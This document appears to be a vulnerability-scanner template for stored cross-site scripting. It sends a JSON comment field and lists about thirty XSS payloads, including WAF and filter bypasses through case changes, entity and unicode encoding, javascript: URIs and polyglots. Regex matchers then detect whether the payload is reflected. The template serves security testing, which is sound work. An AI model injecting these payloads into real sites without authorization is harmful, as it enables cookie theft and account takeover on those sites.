id: generic-xss-stored
info:
  name: Stored XSS - Advanced Payloads
  description: Stored XSS testing with bypass techniques for WAFs and filters
  tags:
    - xss
    - stored
    - generic

generic:
  endpoint: "{{xss_stored}}"
  method: POST
  content_type: "application/json"
  body_template: '{"comment": "{{payload}}"}'

  payloads:
    # Basic script tags
    - name: "script_basic"
      value: "<script>alert(document.cookie)</script>"

    - name: "script_no闭合"
      value: "<script>alert(String.fromCharCode(88,83,83))</script>"

    # Event handlers - various HTML tags
    - name: "img_onerror"
      value: "<img src=x onerror=alert(1)>"

    - name: "img_onerror_unicode"
      value: "<img src=x onerror=alert&#40;1&#41;>"

    - name: "svg_onload"
      value: "<svg onload=alert(1)>"

    - name: "svg_onload_unicode"
      value: "<svg onload=alert&#40;1&#41;>"

    - name: "body_onload"
      value: "<body onload=alert(1)>"

    - name: "details_ontoggle"
      value: "<details open ontoggle=alert(1)>"

    - name: "marquee_onstart"
      value: "<marquee onstart=alert(1)>"

    - name: "video_poster"
      value: "<video poster=javascript:alert(1)>"

    - name: "iframe_src"
      value: "<iframe src=javascript:alert(1)>"

    # Bypass techniques - case variation
    - name: "script_uppercase"
      value: "<SCRIPT>alert(1)</SCRIPT>"

    - name: "img_mixed_case"
      value: "<ImG sRc=x oNeRrOr=alert(1)>"

    # Bypass techniques - encoding
    - name: "img_hex_entities"
      value: "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>"

    - name: "script_unicode"
      value: "<script>\u0061lert(1)</script>"

    # Bypass techniques - tag obfuscation
    - name: "script_with_space"
      value: "<script /**/>alert(1)</script>"

    - name: "script_with_comment"
      value: "<script><!--alert(1)--></script>"

    # Bypass techniques - alternative event handlers
    - name: "input_autofocus"
      value: "<input onfocus=alert(1) autofocus>"

    - name: "select_onfocus"
      value: "<select onfocus=alert(1) autofocus>"

    - name: "textarea_onfocus"
      value: "<textarea onfocus=alert(1) autofocus>"

    - name: "keygen_onfocus"
      value: "<keygen onfocus=alert(1) autofocus>"

    # Bypass techniques - data URIs
    - name: "object_data"
      value: '<object data="javascript:alert(1)">'

    - name: "embed_src"
      value: '<embed src="javascript:alert(1)">'

    # Bypass techniques - style based
    - name: "style_expression"
      value: "<style>body{background:url('javascript:alert(1)')}</style>"

    - name: "div_style"
      value: "<div style=\"background:url('javascript:alert(1)')\">"

    # Bypass techniques - rare tags
    - name: "math_bracket"
      value: "<math><bracket>{alert(1)}</bracket></math>"

    # Polyglots
    - name: "xss_polyglot1"
      value: "javascript:///*--></title></style></textarea></script><x>//\"'`--><img src=x onerror=alert(1)>"

    - name: "xss_polyglot2"
      value: "\"`'><script>alert(1)</script>"

  matchers:
    # Direct reflection
    - type: regex
      condition: or
      regex:
        - "<script>alert\\("
        - "<img[^>]+onerror"
        - "<svg[^>]+onload"
        - "<body[^>]+onload"
        - "<details[^>]+ontoggle"
        - "javascript:"
        - "onfocus=alert"
        - "onerror=alert"
        - "onload=alert"

    # Encoded variants
    - type: word
      condition: or
      words:
        - "&#x61;"
        - "&#106;"
        - "&lt;script"
        - "&lt;img"
